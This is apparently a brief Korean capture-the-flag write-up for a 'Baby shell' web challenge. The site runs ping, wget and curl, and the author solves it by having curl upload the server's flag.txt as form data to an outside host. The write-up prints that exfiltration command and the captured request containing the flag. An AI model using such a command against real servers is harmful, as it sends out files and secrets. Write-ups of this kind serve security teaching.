# Baby shell
web.isangxcauition.xyz:20400

Made by 명석

Ping, Wget, CuRL 명령어를 실행하는 웹사이트로 다음과 같이 curl 명령어의 F 옵션을 이용해 form data 를 포함시켜 request로 보내서 FLAG를 받을 수 있었다.
```sh
curl -F password=@./flag.txt https://example.com
```
Response
```
POST / HTTP/1.1
Host: txkyeou.request.dreamhack.games
Connection: close
Content-Length: 234
User-Agent: curl/7.74.0
Accept: */*
Content-Type: multipart/form-data; boundary=------------------------f02e6527d9f36ea6

--------------------------f02e6527d9f36ea6

Content-Disposition: form-data; name="password"; filename="flag.txt"

Content-Type: text/plain



IxC{D0nt_mak3_us3r_t0_wr1t3_f1l3_t0_s3rv3r}


--------------------------f02e6527d9f36ea6--
```
